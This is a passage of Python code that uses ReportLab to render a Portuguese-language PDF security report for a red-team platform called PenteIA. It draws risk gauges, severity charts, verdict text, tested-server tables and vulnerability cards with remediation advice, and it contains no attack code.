    from reportlab.platypus import (SimpleDocTemplate, Paragraph, Spacer, Table,
                                    TableStyle, HRFlowable, PageBreak, KeepTogether)
    from reportlab.lib.units import cm
    from reportlab.graphics.shapes import Drawing, Wedge, Circle, Line, Rect
    from reportlab.graphics.shapes import String as GStr
    from reportlab.graphics.charts.piecharts import Pie
    from reportlab.graphics.charts.barcharts import VerticalBarChart

    W, H = A4
    M  = 1.8 * cm          # margens: 51pt cada lado
    CW = W - 2 * M         # largura de conteúdo ≈ 493pt

    # ── Paleta ───────────────────────────────────────────────────────────────
    C     = colors.HexColor
    NAVY  = C("#0d1b2a");  NAVY2 = C("#182635")
    TEAL  = C("#00b4d8");  TEAL2 = C("#48cae4")
    ORANG = C("#ff6b35");  YELLO = C("#ffd166")
    GREEN = C("#06d6a0");  CRED  = C("#ef476f")
    GR1   = C("#f8f9fa");  GR2   = C("#e9ecef")
    GR3   = C("#6c757d");  DARK  = C("#212529")
    WHT   = colors.white
    SEV_C = {"Critical": CRED, "High": ORANG, "Medium": YELLO, "Low": TEAL}
    SEV_P = {"Critical": "CRÍTICO", "High": "ALTO", "Medium": "MÉDIO", "Low": "BAIXO"}

    # ── Estilos ──────────────────────────────────────────────────────────────
    ss = getSampleStyleSheet()
    def S(n, **kw): return ParagraphStyle(n, parent=ss["Normal"], **kw)

    SECTION = S("SN",  fontSize=16, textColor=NAVY,  fontName="Helvetica-Bold", spaceBefore=10, spaceAfter=5,  leading=20)
    H2S     = S("H2S", fontSize=11, textColor=DARK,  fontName="Helvetica-Bold", spaceBefore=7,  spaceAfter=3,  leading=14)
    BODY    = S("BDS", fontSize=9,  textColor=DARK,  leading=14, spaceAfter=3)
    BOLD9   = S("B9S", fontSize=9,  textColor=DARK,  fontName="Helvetica-Bold", leading=14)
    FIX     = S("FXS", fontSize=9,  textColor=C("#1a5276"), leading=14)
    CAP     = S("CPS", fontSize=7.5, textColor=GR3,  leading=11)
    SML     = S("SMS", fontSize=8,   textColor=GR3,  leading=11)
    V_OK    = S("VOK", fontSize=22, textColor=GREEN, fontName="Helvetica-Bold", leading=28)
    V_AT    = S("VAT", fontSize=22, textColor=ORANG, fontName="Helvetica-Bold", leading=28)
    V_CR    = S("VCR", fontSize=22, textColor=CRED,  fontName="Helvetica-Bold", leading=28)

    # ── Dados ────────────────────────────────────────────────────────────────
    sims = data.get("simulations", [])
    done = [s for s in sims if s.get("status") == "completed"]

    all_techs: list = []
    for s in done:
        for t in s.get("techniques", []):
            t["_target"] = s.get("target", "—")
            all_techs.append(t)

    vulns = [t for t in all_techs if t.get("status") == "found"]
    safes = [t for t in all_techs if t.get("status") in ("blocked", "safe")]
    score = round(sum(s.get("score", 0) for s in done) / max(len(done), 1), 1) if done else 0.0

    crit = [t for t in vulns if t.get("cvss_severity") == "Critical"]
    high = [t for t in vulns if t.get("cvss_severity") == "High"]
    meds = [t for t in vulns if t.get("cvss_severity") == "Medium"]
    lows = [t for t in vulns if t.get("cvss_severity") == "Low"]

    agents = data.get("agents", [])
    ag_v: list = []
    for ag in agents:
        for r in ag.get("results", []):
            if r.get("status") == "found":
                r["_host"] = ag.get("hostname", "—")
                ag_v.append(r)

    n_vuln = len(set(t.get("id", "") for t in vulns)) + len(ag_v)
    n_safe = len(safes)
    n_test = len(all_techs)

    if score < 20:
        vtext, vstyle, vhex, vdesc = (
            "BOM NÍVEL DE SEGURANÇA", V_OK, "#06d6a0",
            "O servidor demonstrou boa resistência. A maioria dos controles de segurança está "
            "funcionando. Corrija os poucos pontos indicados para atingir excelência.")
    elif score < 50:
        vtext, vstyle, vhex, vdesc = (
            "ATENÇÃO NECESSÁRIA", V_AT, "#ff6b35",
            "Vulnerabilidades identificadas que requerem atenção. Um atacante motivado poderia "
            "explorar os pontos fracos encontrados. Corrija com prioridade.")
    else:
        vtext, vstyle, vhex, vdesc = (
            "RISCO CRÍTICO", V_CR, "#ef476f",
            "Múltiplas falhas graves confirmadas. O servidor está significativamente exposto. "
            "Ação corretiva urgente é necessária antes de qualquer nova exposição.")

    # ── Desenhos / Gráficos ──────────────────────────────────────────────────

    def make_gauge(sc: float, gw: int = 228, gh: int = 152) -> Drawing:
        d  = Drawing(gw, gh)
        cx = gw / 2;  cy = 28
        R  = min(gw / 2 - 16, gh - 40);  r = R * 0.60

        for sa, ea, col in [(120, 180, GREEN), (60, 120, YELLO), (0, 60, CRED)]:
            wdg = Wedge(cx, cy, R, sa, ea, radius1=r)
            wdg.fillColor = col;  wdg.strokeColor = WHT;  wdg.strokeWidth = 2
            d.add(wdg)

        for pct in [0, 25, 50, 75, 100]:
            ang = math.radians(180 * (1 - pct / 100))
            tck = Line(cx + (R + 2) * math.cos(ang),  cy + (R + 2) * math.sin(ang),
                       cx + (R + 9) * math.cos(ang),  cy + (R + 9) * math.sin(ang))
            tck.strokeColor = GR3;  tck.strokeWidth = 1
            d.add(tck)
            lx = cx + (R + 18) * math.cos(ang)
            ly = cy + (R + 18) * math.sin(ang) - 4
            lbl = GStr(lx, ly, f"{pct}%")
            lbl.fontSize = 6.5;  lbl.fillColor = GR3
            lbl.textAnchor = "middle";  lbl.fontName = "Helvetica"
            d.add(lbl)

        na = math.radians(180 * (1 - sc / 100));  nl = r * 0.88
        shd = Line(cx + 1.5, cy - 1.5, cx + nl * math.cos(na) + 1.5, cy + nl * math.sin(na) - 1.5)
        shd.strokeColor = C("#aaaaaa");  shd.strokeWidth = 5;  shd.strokeLineCap = 1
        d.add(shd)
        ndl = Line(cx, cy, cx + nl * math.cos(na), cy + nl * math.sin(na))
        ndl.strokeColor = NAVY;  ndl.strokeWidth = 3;  ndl.strokeLineCap = 1
        d.add(ndl)

        csh = Circle(cx + 1, cy - 1, 10);  csh.fillColor = C("#aaaaaa");  csh.strokeColor = None
        d.add(csh)
        cap = Circle(cx, cy, 10);  cap.fillColor = NAVY;  cap.strokeColor = WHT;  cap.strokeWidth = 1.5
        d.add(cap)

        bw, bh = 68, 30;  bx = cx - bw / 2;  by = cy + r * 0.32
        bg = Rect(bx, by, bw, bh, rx=4, ry=4)
        bg.fillColor = NAVY;  bg.strokeColor = TEAL;  bg.strokeWidth = 1.2
        d.add(bg)
        sv = GStr(cx, by + 9, f"{sc:.1f}%")
        sv.fontName = "Helvetica-Bold";  sv.fontSize = 16
        sv.fillColor = WHT;  sv.textAnchor = "middle"
        d.add(sv)
        sl = GStr(cx, by + 3, "RISCO")
        sl.fontName = "Helvetica";  sl.fontSize = 6
        sl.fillColor = TEAL2;  sl.textAnchor = "middle"
        d.add(sl)

        for txt, xo in [("SEGURO", -R + 8), ("CRÍTICO", R - 44)]:
            gl = GStr(cx + xo, cy - 15, txt)
            gl.fontSize = 6.5;  gl.fillColor = GR3;  gl.fontName = "Helvetica-Bold"
            d.add(gl)
        return d

    def make_donut(vals_cols: list, dw: int = 185, dh: int = 185) -> Drawing:
        d = Drawing(dw, dh)
        if not any(v for v, _ in vals_cols):
            # placeholder quando não há dados
            ph = Circle(dw/2, dh/2, (dw-30)/2)
            ph.fillColor = GR2;  ph.strokeColor = GR2;  ph.strokeWidth = 0
            d.add(ph)
            hole = Circle(dw/2, dh/2, (dw-30)/2 * 0.44)
            hole.fillColor = WHT;  hole.strokeColor = None
            d.add(hole)
            lbl = GStr(dw/2, dh/2-5, "sem dados")
            lbl.fontSize=9; lbl.fillColor=GR3; lbl.textAnchor="middle"; lbl.fontName="Helvetica"
            d.add(lbl)
            return d
        p = Pie()
        p.x = 15;  p.y = 15;  p.width = dw - 30;  p.height = dh - 30
        p.data = [max(v, 0.001) for v, _ in vals_cols]
        for i, (v, hx) in enumerate(vals_cols):
            p.slices[i].fillColor  = C(hx)
            p.slices[i].strokeColor = WHT
            p.slices[i].strokeWidth = 2.5
            p.slices[i].label_visible = 0
        d.add(p)
        hole = Circle(dw / 2, dh / 2, (dw - 30) / 2 * 0.44)
        hole.fillColor = WHT;  hole.strokeColor = None
        d.add(hole)
        total = sum(v for v, _ in vals_cols)
        cnt = GStr(dw / 2, dh / 2 - 6, str(total))
        cnt.fontName = "Helvetica-Bold";  cnt.fontSize = 18
        cnt.fillColor = DARK;  cnt.textAnchor = "middle"
        d.add(cnt)
        lbl = GStr(dw / 2, dh / 2 - 15, "total")
        lbl.fontName = "Helvetica";  lbl.fontSize = 8
        lbl.fillColor = GR3;  lbl.textAnchor = "middle"
        d.add(lbl)
        return d

    def make_bars(cats: list, v_v: list, v_s: list, bw: int = 240, bh: int = 185) -> Drawing:
        d = Drawing(bw, bh)
        if not cats:
            return d
        bc = VerticalBarChart()
        bc.x = 42;  bc.y = 28;  bc.width = bw - 58;  bc.height = bh - 44
        bc.data = [v_v, v_s]
        bc.strokeColor = None
        bc.groupSpacing = 10;  bc.barSpacing = 2
        mx = max(max(v_v or [0]), max(v_s or [0]), 1)
        bc.valueAxis.valueMin = 0
        bc.valueAxis.valueMax = mx + max(1, mx // 4)
        bc.valueAxis.valueStep = max(1, (mx + 1) // 4)
        bc.valueAxis.labels.fontSize   = 7;   bc.valueAxis.labels.fillColor = GR3
        bc.valueAxis.strokeColor       = GR2;  bc.valueAxis.gridStrokeColor  = GR2
        bc.categoryAxis.categoryNames  = cats
        bc.categoryAxis.labels.fontSize   = 7.5
        bc.categoryAxis.labels.fillColor  = GR3
        bc.categoryAxis.strokeColor       = GR2
        bc.bars[0].fillColor = CRED
        bc.bars[1].fillColor = GREEN
        d.add(bc)
        return d

    def hr(c=NAVY, t=0.5, sa=8):
        return HRFlowable(width="100%", thickness=t, color=c, spaceAfter=sa, spaceBefore=3)

    def section_band(text: str, sub: str = ""):
        rows = [[Paragraph(text, S("SB", fontSize=13, textColor=WHT, fontName="Helvetica-Bold", leading=18))]]
        if sub:
            rows.append([Paragraph(sub, S("SBS", fontSize=8.5, textColor=C("#a8c8e0"), leading=12))])
        tbl = Table(rows, colWidths=[CW])
        tbl.setStyle(TableStyle([
            ("BACKGROUND",   (0,0),(-1,-1), NAVY),
            ("TOPPADDING",   (0,0),(-1,-1), 10), ("BOTTOMPADDING",(0,0),(-1,-1),10),
            ("LEFTPADDING",  (0,0),(-1,-1), 14), ("RIGHTPADDING",(0,0),(-1,-1),14),
            ("LINEBELOW",    (0,-1),(-1,-1), 2.5, TEAL),
        ]))
        return tbl

    def make_deco_circles(dw=90, dh=90) -> Drawing:
        d = Drawing(dw, dh)
        cx, cy = dw, dh * 0.5
        for r, alpha in [(70, 0.15), (48, 0.22), (28, 0.30)]:
            c2 = Circle(cx, cy, r)
            c2.fillColor = None
            c2.strokeColor = TEAL
            c2.strokeWidth = 1.2
            c2.strokeOpacity = alpha
            d.add(c2)
        return d

    # ── Story ────────────────────────────────────────────────────────────────
    buf = io.BytesIO()
    doc = SimpleDocTemplate(buf, pagesize=A4, topMargin=M, bottomMargin=M,
                            leftMargin=M, rightMargin=M)

    story = []

    # ═══════════════════════════════════════════════════════════════════════════
    # CAPA
    # ═══════════════════════════════════════════════════════════════════════════

    # Top bar: branding
    top_bar = Table([[
        Paragraph("PenteIA",
                  S("log", fontSize=18, textColor=TEAL, fontName="Helvetica-Bold", leading=24)),
        Paragraph("v4.0  —  Red Team Platform",
                  S("ver", fontSize=9, textColor=C("#8fb3cc"), leading=24)),
        Paragraph("⚠  DOCUMENTO CONFIDENCIAL",
                  S("cnf", fontSize=8, textColor=YELLO, fontName="Helvetica-Bold", leading=24, alignment=2)),
    ]], colWidths=[3.8*cm, 6.8*cm, CW - 10.6*cm])
    top_bar.setStyle(TableStyle([
        ("BACKGROUND",    (0,0),(-1,-1), NAVY2),
        ("TOPPADDING",    (0,0),(-1,-1), 12), ("BOTTOMPADDING",(0,0),(-1,-1),12),
        ("LEFTPADDING",   (0,0),(-1,-1), 16), ("RIGHTPADDING",(0,0),(-1,-1),16),
        ("VALIGN",        (0,0),(-1,-1), "MIDDLE"), ("ALIGN",(2,0),(2,0),"RIGHT"),
    ]))
    story.append(top_bar)

    # Hero: título (esquerda) + gauge + deco-circles (direita)
    g     = make_gauge(score)
    deco  = make_deco_circles(90, 90)
    g_col = g.width + 18
    deco_col = 90

    title_rows = [
        [Paragraph("RELATÓRIO DE SEGURANÇA DIGITAL",
                   S("RT", fontSize=9, textColor=C("#8fb3cc"), fontName="Helvetica", leading=12))],
        [Paragraph(title or "Análise Completa de Segurança",
                   S("TIT", fontSize=20, textColor=WHT, fontName="Helvetica-Bold", leading=26))],
        [Spacer(1, 0.22*cm)],
        [Paragraph(f"Data: {generated_at[:10].replace('-','/')}  |  Tipo: {report_type.upper()}",
                   S("DT", fontSize=8.5, textColor=C("#8fb3cc"), leading=12))],
        [Spacer(1, 0.3*cm)],
        [HRFlowable(width="78%", thickness=1.2, color=TEAL, spaceAfter=6, spaceBefore=0)],
        [Paragraph(vtext, S("VTX", fontSize=15, textColor=C(vhex), fontName="Helvetica-Bold", leading=20))],
        [Spacer(1, 0.18*cm)],
        [Paragraph(vdesc, S("VD", fontSize=8.5, textColor=C("#a8c8e0"), leading=13))],
    ]
    t_col = CW - g_col - deco_col
    title_cell = Table(title_rows, colWidths=[t_col])
    title_cell.setStyle(TableStyle([
        ("BACKGROUND",  (0,0),(-1,-1), NAVY),
        ("TOPPADDING",  (0,0),(-1,-1), 6), ("BOTTOMPADDING",(0,0),(-1,-1),4),
        ("LEFTPADDING", (0,0),(-1,-1), 22), ("RIGHTPADDING",(0,0),(-1,-1),10),
        ("VALIGN",      (0,0),(-1,-1), "TOP"),
    ]))
    gauge_cell = Table([[g]], colWidths=[g_col])
    gauge_cell.setStyle(TableStyle([
        ("BACKGROUND",  (0,0),(-1,-1), NAVY),
        ("TOPPADDING",  (0,0),(-1,-1), 14), ("BOTTOMPADDING",(0,0),(-1,-1),8),
        ("LEFTPADDING", (0,0),(-1,-1), 6), ("RIGHTPADDING",(0,0),(-1,-1),0),
        ("VALIGN",      (0,0),(-1,-1), "MIDDLE"),
    ]))
    deco_cell = Table([[deco]], colWidths=[deco_col])
    deco_cell.setStyle(TableStyle([
        ("BACKGROUND",  (0,0),(-1,-1), NAVY),
        ("TOPPADDING",  (0,0),(-1,-1), 0), ("BOTTOMPADDING",(0,0),(-1,-1),0),
        ("LEFTPADDING", (0,0),(-1,-1), 0), ("RIGHTPADDING",(0,0),(-1,-1),0),
        ("VALIGN",      (0,0),(-1,-1), "MIDDLE"),
    ]))
    hero = Table([[title_cell, gauge_cell, deco_cell]], colWidths=[t_col, g_col, deco_col])
    hero.setStyle(TableStyle([
        ("LEFTPADDING",(0,0),(-1,-1),0), ("RIGHTPADDING",(0,0),(-1,-1),0),
        ("TOPPADDING", (0,0),(-1,-1),0), ("BOTTOMPADDING",(0,0),(-1,-1),0),
        ("VALIGN",     (0,0),(-1,-1),"TOP"),
    ]))
    story.append(hero)

    # Metric cards strip
    def mcard(lbl, val, sub, acc):
        c = Table([
            [Paragraph(lbl, S(f"ML{lbl[:6]}", fontSize=7.5, textColor=C("#7fb3cc"),
                               fontName="Helvetica-Bold", leading=10))],
            [Paragraph(str(val), S(f"MV{lbl[:6]}", fontSize=26, textColor=WHT,
                                    fontName="Helvetica-Bold", leading=32))],
            [Paragraph(sub, S(f"MS{lbl[:6]}", fontSize=7.5, textColor=acc, leading=10))],
        ], colWidths=[CW / 4])
        c.setStyle(TableStyle([
            ("BACKGROUND",  (0,0),(-1,-1), NAVY2),
            ("TOPPADDING",  (0,0),(-1,-1), 10), ("BOTTOMPADDING",(0,0),(-1,-1),10),
            ("LEFTPADDING", (0,0),(-1,-1), 16), ("RIGHTPADDING",(0,0),(-1,-1),6),
            ("LINEABOVE",   (0,0),(-1,0), 3, acc),
        ]))
        return c

    s_acc = CRED if score >= 50 else ORANG if score >= 20 else GREEN
    metrics = Table([[
        mcard("SCORE DE RISCO",  f"{score:.0f}%",   "risco explorado",    s_acc),
        mcard("VULNERABILIDADES", n_vuln,             "falhas confirmadas",  CRED if n_vuln>0 else GREEN),
        mcard("VERIFICAÇÕES",     n_test,             "testes executados",   TEAL),
        mcard("CONTROLES OK",     n_safe,             "proteções ativas",    GREEN),
    ]], colWidths=[CW / 4] * 4)
    metrics.setStyle(TableStyle([
        ("LEFTPADDING", (0,0),(-1,-1),2), ("RIGHTPADDING",(0,0),(-1,-1),2),
        ("TOPPADDING",  (0,0),(-1,-1),0), ("BOTTOMPADDING",(0,0),(-1,-1),0),
    ]))
    story.append(metrics)
    story.append(Spacer(1, 0.3*cm))

    # Barra de progresso colorida
    if n_test > 0:
        vp = n_vuln / n_test * 100
        sp = n_safe / n_test * 100
        op = max(0, 100 - vp - sp)
        segs, wids = [], []
        for pct, col in [(vp, CRED), (sp, GREEN), (op, ORANG)]:
            if pct > 0.5:
                seg = Table([[""]], colWidths=[CW * pct / 100])
                seg.setStyle(TableStyle([
                    ("BACKGROUND",    (0,0),(-1,-1), col),
                    ("TOPPADDING",    (0,0),(-1,-1), 4), ("BOTTOMPADDING",(0,0),(-1,-1),4),
                    ("LEFTPADDING",   (0,0),(-1,-1), 0), ("RIGHTPADDING",(0,0),(-1,-1),0),
                ]))
                segs.append(seg);  wids.append(CW * pct / 100)
        if segs:
            bar = Table([segs], colWidths=wids)
            bar.setStyle(TableStyle([
                ("LEFTPADDING", (0,0),(-1,-1),0), ("RIGHTPADDING",(0,0),(-1,-1),0),
                ("TOPPADDING",  (0,0),(-1,-1),0), ("BOTTOMPADDING",(0,0),(-1,-1),0),
            ]))
            story.append(bar)
        story.append(Paragraph(
            f"<font color='#ef476f'>■</font> Vulnerável: {vp:.0f}%   "
            f"<font color='#06d6a0'>■</font> Protegido: {sp:.0f}%   "
            f"<font color='#ff6b35'>■</font> Outros: {op:.0f}%", CAP))

    # ═══════════════════════════════════════════════════════════════════════════
    # PÁG 2: ANÁLISE VISUAL
    # ═══════════════════════════════════════════════════════════════════════════
    story.append(PageBreak())
    story.append(section_band("Análise Visual dos Resultados"))
    story.append(Spacer(1, 0.25*cm))

    # Gráficos lado a lado — larguras pré-calculadas para evitar overflow
    DONUT_SEC_W = int(CW * 0.54)        # ≈266pt
    BARS_SEC_W  = int(CW - DONUT_SEC_W - 8)  # ≈219pt
    GAP_CHARTS  = 8
    LEG_W       = 96
    DONUT_PAD   = 20                    # leftPadding(12) + rightPadding(8)
    BARS_PAD    = 22                    # leftPadding(12) + rightPadding(10)
    DONUT_DW    = DONUT_SEC_W - DONUT_PAD - LEG_W   # donut drawing width
    BARS_DW     = BARS_SEC_W - BARS_PAD              # bar chart drawing width

    sev_vals = [
        (len(crit), "#ef476f"), (len(high), "#ff6b35"),
        (len(meds), "#ffd166"), (len(lows), "#00b4d8"), (len(safes), "#06d6a0"),
    ]
    donut_d = make_donut(sev_vals, dw=DONUT_DW, dh=DONUT_DW)

    b_cats = ["Crítico", "Alto", "Médio", "Baixo", "OK"]
    b_v    = [len(crit), len(high), len(meds), len(lows), 0]
    b_s    = [0, 0, 0, 0, n_safe]
    bars_d = make_bars(b_cats, b_v, b_s, bw=BARS_DW, bh=DONUT_DW)

    # Legenda do donut
    leg_items = [
        ("Crítico",   len(crit),  "#ef476f"), ("Alto",      len(high),  "#ff6b35"),
        ("Médio",     len(meds),  "#ffd166"), ("Baixo",     len(lows),  "#00b4d8"),
        ("Protegido", len(safes), "#06d6a0"),
    ]
    leg_rows = []
    for nm, cnt, hx in leg_items:
        dot_d = Drawing(10, 10)
        dot   = Rect(1, 1, 8, 8);  dot.fillColor = C(hx);  dot.strokeColor = None
        dot_d.add(dot)
        leg_rows.append([dot_d, Paragraph(f"{nm}  <b>{cnt}</b>",
                                           S(f"LG{nm}", fontSize=9, textColor=DARK, leading=13))])
    leg_tbl = Table(leg_rows, colWidths=[14, LEG_W - 14])
    leg_tbl.setStyle(TableStyle([
        ("TOPPADDING",   (0,0),(-1,-1),3), ("BOTTOMPADDING",(0,0),(-1,-1),3),
        ("LEFTPADDING",  (0,0),(-1,-1),2), ("RIGHTPADDING",(0,0),(-1,-1),2),
        ("VALIGN",       (0,0),(-1,-1),"MIDDLE"),
    ]))

    inner_donut_tbl = Table([[donut_d, leg_tbl]], colWidths=[DONUT_DW, LEG_W])
    inner_donut_tbl.setStyle(TableStyle([
        ("LEFTPADDING", (0,0),(-1,-1),0), ("RIGHTPADDING",(0,0),(-1,-1),0),
        ("TOPPADDING",  (0,0),(-1,-1),0), ("BOTTOMPADDING",(0,0),(-1,-1),0),
        ("VALIGN",      (0,0),(-1,-1),"MIDDLE"),
    ]))

    donut_sec = Table([
        [Paragraph("Distribuição por Gravidade", H2S)],
        [Paragraph("Proporção de achados por nível de risco.", CAP)],
        [Spacer(1, 4)],
        [inner_donut_tbl],
    ], colWidths=[DONUT_SEC_W])
    donut_sec.setStyle(TableStyle([
        ("BACKGROUND",  (0,0),(-1,-1), GR1), ("BOX",(0,0),(-1,-1),0.5,GR2),
        ("TOPPADDING",  (0,0),(-1,-1),12), ("BOTTOMPADDING",(0,0),(-1,-1),12),
        ("LEFTPADDING", (0,0),(-1,-1),12), ("RIGHTPADDING",(0,0),(-1,-1),8),
    ]))

    bars_sec = Table([
        [Paragraph("Achados por Categoria", H2S)],
        [Paragraph("Comparativo: vulnerável vs protegido.", CAP)],
        [Spacer(1, 4)],
        [bars_d],
        [Paragraph("<font color='#ef476f'>■</font> Vulnerável   "
                   "<font color='#06d6a0'>■</font> Protegido", CAP)],
    ], colWidths=[BARS_SEC_W])
    bars_sec.setStyle(TableStyle([
        ("BACKGROUND",  (0,0),(-1,-1), GR1), ("BOX",(0,0),(-1,-1),0.5,GR2),
        ("TOPPADDING",  (0,0),(-1,-1),12), ("BOTTOMPADDING",(0,0),(-1,-1),12),
        ("LEFTPADDING", (0,0),(-1,-1),12), ("RIGHTPADDING",(0,0),(-1,-1),10),
    ]))

    charts = Table([[donut_sec, bars_sec]], colWidths=[DONUT_SEC_W, BARS_SEC_W])
    charts.setStyle(TableStyle([
        ("LEFTPADDING",  (0,0),(-1,-1),0), ("TOPPADDING",(0,0),(-1,-1),0),
        ("BOTTOMPADDING",(0,0),(-1,-1),0), ("VALIGN",(0,0),(-1,-1),"TOP"),
        ("RIGHTPADDING", (0,0),(0,0),GAP_CHARTS), ("RIGHTPADDING",(1,0),(1,0),0),
    ]))
    story.append(charts)
    story.append(Spacer(1, 0.45*cm))

    # Veredicto + resumo executivo
    story.append(section_band("Veredicto"))
    story.append(Paragraph(vtext, vstyle))
    story.append(Spacer(1, 3))
    story.append(Paragraph(vdesc, BODY))
    story.append(Spacer(1, 0.3*cm))

    sum_data = [
        ["O que foi testado",
         f"{len(done)} sessão(ões) de ataque simulado com {n_test} verificações de segurança."],
        ["Vulnerabilidades",
         f"{n_vuln} confirmada(s): {len(crit)} crítica(s), {len(high)} alta(s), "
         f"{len(meds)} média(s), {len(lows)} baixa(s)."],
        ["Proteções ativas",
         f"{n_safe} controle(s) funcionando (autenticação, bloqueios, criptografia)."],
        ["Ação recomendada",
         "Corrigir falhas da Seção 3 pela ordem de prioridade indicada."
         if n_vuln > 0 else "Manter monitoramento periódico."],
    ]
    st = Table([[Paragraph(k, BOLD9), Paragraph(v, BODY)] for k, v in sum_data],
               colWidths=[4.4*cm, CW - 4.4*cm])
    st.setStyle(TableStyle([
        ("ROWBACKGROUNDS", (0,0),(-1,-1), [GR1, WHT]),
        ("FONTSIZE",       (0,0),(-1,-1), 9), ("LEADING",(0,0),(-1,-1),13),
        ("TEXTCOLOR",      (0,0),(0,-1),  GR3),
        ("TOPPADDING",     (0,0),(-1,-1), 7), ("BOTTOMPADDING",(0,0),(-1,-1),7),
        ("LEFTPADDING",    (0,0),(-1,-1), 10),
        ("GRID",           (0,0),(-1,-1), 0.3, GR2),
        ("LINEABOVE",      (0,0),(-1,0),  2, TEAL),
    ]))
    story.append(st)

    # Narrativa LLM (se disponível)
    narrative = data.get("executive_narrative", "")
    if narrative:
        story.append(Spacer(1, 0.35*cm))
        story.append(Paragraph("Análise Narrativa (IA)", H2S))
        narr_box = Table([[Paragraph(narrative, S("NAR", fontSize=9, textColor=DARK, leading=14))]], colWidths=[CW])
        narr_box.setStyle(TableStyle([
            ("BACKGROUND",    (0,0),(-1,-1), C("#eaf4fb")),
            ("TOPPADDING",    (0,0),(-1,-1), 10), ("BOTTOMPADDING",(0,0),(-1,-1),10),
            ("LEFTPADDING",   (0,0),(-1,-1), 14), ("RIGHTPADDING",(0,0),(-1,-1),14),
            ("LINEBELOW",     (0,0),(-1,-1), 2, TEAL),
            ("LINEBEFORE",    (0,0),(0,-1),  3, TEAL2),
        ]))
        story.append(narr_box)

    # Alvos testados
    if done:
        story.append(Spacer(1, 0.4*cm))
        story.append(Paragraph("Servidores Testados", H2S))
        hrow = [Paragraph(t, S(f"TH{i}", fontSize=8, textColor=WHT, fontName="Helvetica-Bold", leading=11))
                for i, t in enumerate(["Servidor", "Testes", "Vuln.", "Proteg.", "Score", "Situação"])]
        rows2 = [hrow]
        for s in done:
            ts  = s.get("techniques", [])
            vn  = len([t for t in ts if t.get("status") == "found"])
            bn  = len([t for t in ts if t.get("status") in ("blocked", "safe")])
            sc2 = s.get("score", 0)
            sc  = GREEN if sc2 < 20 else ORANG if sc2 < 50 else CRED
            sit = "Bom" if sc2 < 20 else "Atenção" if sc2 < 50 else "Crítico"
            rows2.append([
                s.get("target", "—"), len(ts), vn, bn, f"{sc2:.1f}%",
                Paragraph(sit, S(f"SIT{sc2}", fontSize=8, textColor=sc, fontName="Helvetica-Bold", leading=11)),
            ])
        tgt = Table(rows2, colWidths=[5.5*cm, 2*cm, 2*cm, 2.5*cm, 2.2*cm, 3*cm])
        tgt.setStyle(TableStyle([
            ("BACKGROUND",    (0,0),(-1,0), NAVY), ("TEXTCOLOR",(0,0),(-1,0),WHT),
            ("FONTSIZE",      (0,0),(-1,-1), 8),
            ("ROWBACKGROUNDS",(0,1),(-1,-1), [GR1, WHT]),
            ("GRID",          (0,0),(-1,-1), 0.3, GR2),
            ("ALIGN",         (1,0),(-1,-1), "CENTER"),
            ("TOPPADDING",    (0,0),(-1,-1), 6), ("BOTTOMPADDING",(0,0),(-1,-1),6),
            ("LEFTPADDING",   (0,0),(-1,-1), 8),
        ]))
        story.append(tgt)

    # ═══════════════════════════════════════════════════════════════════════════
    # PÁG 3+: VULNERABILIDADES
    # ═══════════════════════════════════════════════════════════════════════════
    story.append(PageBreak())
    story.append(section_band("Vulnerabilidades Encontradas"))
    story.append(Spacer(1, 0.2*cm))
    story.append(Paragraph(
        "Cada item é um problema de segurança confirmado nos testes. "
        "Ordenados do mais grave ao menos grave, com explicação simples e orientação de correção.", BODY))
    story.append(Spacer(1, 0.35*cm))

    def sev_ord(t): return {"Critical": 0, "High": 1, "Medium": 2, "Low": 3}.get(t.get("cvss_severity", ""), 4)
    seen: set = set()
    uniq: list = []
    for t in sorted(vulns, key=sev_ord):
        k = t.get("id", "") + t.get("_target", "")
        if k not in seen:
            seen.add(k);  uniq.append(t)

    def vuln_card(idx, tid, nome, o_que, fix, sev, cvss, target, comp, detail=""):
        sc2 = SEV_C.get(sev, GR3)
        sp2 = SEV_P.get(sev, sev)

        hdr = Table([[
            Paragraph(f"{idx}. {nome}",
                      S(f"VH{idx}", fontSize=10.5, textColor=WHT, fontName="Helvetica-Bold", leading=14)),
            Paragraph(sp2,
                      S(f"VS{idx}", fontSize=9, textColor=WHT, fontName="Helvetica-Bold", leading=13, alignment=2)),
        ]], colWidths=[CW - 3.4*cm, 3.4*cm])
        hdr.setStyle(TableStyle([
            ("BACKGROUND",  (0,0),(-1,-1), sc2),
            ("TOPPADDING",  (0,0),(-1,-1), 8), ("BOTTOMPADDING",(0,0),(-1,-1),8),
            ("LEFTPADDING", (0,0),(-1,-1),12), ("RIGHTPADDING",(0,0),(-1,-1),12),
        ]))

        drows = [
            ["O que significa:", Paragraph(o_que, BODY)],
            ["Como corrigir:",   Paragraph(fix, FIX)],
        ]
        if detail:
            drows.insert(1, ["Detalhe:", Paragraph(detail[:120] + ("…" if len(detail) > 120 else ""), CAP)])

        if cvss > 0:
            cvss_num = Paragraph(
                f"<b>{cvss:.1f}</b><font size='9' color='grey'>/10</font>",
                S(f"CV{idx}", fontSize=24, textColor=sc2, leading=28, alignment=2))
            drows.append(["Gravidade:", cvss_num])

        if target and target != "—":
            drows.append(["Servidor:", Paragraph(target, BODY)])
        if comp:
            drows.append(["Normas:", Paragraph("  ·  ".join(comp[:3]), SML)])

        body_t = Table(drows, colWidths=[3.4*cm, CW - 3.4*cm])
        body_t.setStyle(TableStyle([
            ("FONTSIZE",    (0,0),(-1,-1), 9), ("LEADING",(0,0),(-1,-1),13),
            ("FONTNAME",    (0,0),(0,-1), "Helvetica-Bold"), ("TEXTCOLOR",(0,0),(0,-1),GR3),
            ("VALIGN",      (0,0),(-1,-1), "TOP"),
            ("TOPPADDING",  (0,0),(-1,-1), 5), ("BOTTOMPADDING",(0,0),(-1,-1),5),
            ("LEFTPADDING", (0,0),(-1,-1),12), ("RIGHTPADDING",(0,0),(-1,-1),8),
            ("BACKGROUND",  (0,0),(-1,-1), C("#F8F9FA")),
            ("LINEBELOW",   (0,-1),(-1,-1), 0.5, GR2),
        ]))
        bordered = Table([[body_t]], colWidths=[CW])
        bordered.setStyle(TableStyle([
            ("LEFTPADDING",  (0,0),(-1,-1),0), ("RIGHTPADDING",(0,0),(-1,-1),0),
            ("TOPPADDING",   (0,0),(-1,-1),0), ("BOTTOMPADDING",(0,0),(-1,-1),0),
            ("LINEBEFORE",   (0,0),(0,-1),  6, sc2),
        ]))
        return KeepTogether([hdr, bordered, Spacer(1, 0.4*cm)])

    if not uniq and not ag_v:
        story.append(Paragraph(
            "Nenhuma vulnerabilidade confirmada nesta sessão de testes. Excelente resultado!", BODY))

    for i, t in enumerate(uniq, 1):
